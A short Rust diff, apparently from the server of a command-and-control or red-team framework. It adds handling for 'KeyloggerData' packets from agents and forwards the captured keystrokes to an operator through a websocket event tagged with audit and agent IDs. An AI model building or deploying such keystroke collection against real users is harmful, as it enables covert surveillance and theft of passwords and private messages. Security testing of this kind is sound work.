@@ -382,6 +382,17 @@ async fn multiplex_loop(
                                     .await;
                                 }
                             }
+                            Ok(Packets::KeyloggerData(keylog)) => {
+                                if let Some(io) = io {
+                                    crate::api::ws::events::agent::emit_agent_keylogger(
+                                        io,
+                                        audit_id,
+                                        agent_id,
+                                        &keylog.data,
+                                    )
+                                    .await;
+                                }
+                            }
                             Ok(Packets::StreamOpen(open)) => {
                                 tracing::debug!("Agent opened stream: {}", open.stream_id);
                             }
